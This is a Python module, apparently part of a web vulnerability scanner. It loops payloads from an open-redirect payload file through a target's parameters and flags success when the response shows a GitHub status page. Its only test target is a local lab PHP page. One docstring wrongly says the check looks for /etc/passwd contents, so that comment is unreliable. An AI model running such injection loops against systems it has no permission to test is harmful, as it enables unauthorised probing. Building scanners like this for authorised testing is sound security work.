import sys
import requests
from bs4 import BeautifulSoup

import library

def run(injection_obj):
  print("Running {}\n".format(injection_obj[1]))

  payloads = get_payload_list()
  inject_payloads(injection_obj, payloads)

def inject_payloads(injection_obj, payloads):
  method, link, params, cookie = injection_obj
  is_exploitable = False

  # try injection each payload into each param
  for param_idx in range(len(params)):
    for payload in payloads:
      print("Trying {} request {} with {} as param {}".format(method, link, payload, params[param_idx]))
      response = library.make_request(injection_obj, payload, param_idx)
      is_exploitable = is_successful_redirect(response)
      print(response.text)
      print("Exploitable with payload {}: {}\n".format(payload, is_exploitable))
      # TODO : write results into json

      # TODO refactor this - break after finding the first successful payload
      if is_exploitable:
          break
    if is_exploitable:
        break

def get_payload_list(filename='payloads/open_redirect_payloads.txt'):
  """Returns payloads in payload file as a list"""
  with open(filename) as f:
    payloads = f.read().splitlines()
    return payloads

def is_successful_redirect(response):
  """Checks if reponse constains /etc/passwd contents
  Works by checking if the response contains 'GitHub System Status'

  Args:
    response: Requests response object

  Returns:
    boolean
  """

  TITLE_LINE = 'GitHub System Status'

  if response.status_code != 200:
    return False

  if TITLE_LINE in response.text:
    return True

  # TODO: in case response contains JSON use reponses.json()
  # TODO: check if necessary - maybe using .text is sufficient
  # tested with nusmods api - probably no need to use reponses.json()

  return False

# TODO for testing, remove when done
if __name__ == '__main__':
  injection_obj = ['GET','http://127.0.0.1:8888/openredirect/openredirect.php', ['redirect'], '']
  run(injection_obj)
